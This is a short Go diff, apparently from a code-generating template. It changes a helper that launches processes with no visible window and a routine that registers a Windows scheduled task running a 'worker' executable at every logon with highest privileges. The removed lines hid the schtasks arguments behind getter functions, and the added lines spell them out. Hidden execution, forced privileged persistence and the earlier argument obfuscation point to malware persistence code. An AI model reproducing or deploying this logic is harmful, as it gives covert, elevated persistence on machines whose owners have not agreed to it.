@@ -101,24 +101,14 @@ func copyFile(src, dst string) error {
 
 func cmdHidden(name string, args ...string) *exec.Cmd {
 	cmd := exec.Command(name, args...)
-	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd
 }
 
 func opSetupTask(workerPath string) {
 	taskName := "%s"
 	tr := "\\\"" + workerPath + "\\\" worker"
-	
-	create := getSchtasksCreate()
-	tn := getSchtasksTn()
-	trFlag := getSchtasksTr()
-	sc := getSchtasksSc()
-	onLogon := getSchtasksOnLogon()
-	rl := getSchtasksRl()
-	highest := getSchtasksHighest()
-	f := getSchtasksF()
-
-	cmd := cmdHidden(getSchtasksExeName(), create, tn, taskName, trFlag, tr, sc, onLogon, rl, highest, f)
+	cmd := cmdHidden(getSchtasksExeName(), "/Create", "/TN", taskName, "/TR", tr, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F")
 	_ = cmd.Run()
 }
 `, taskName))
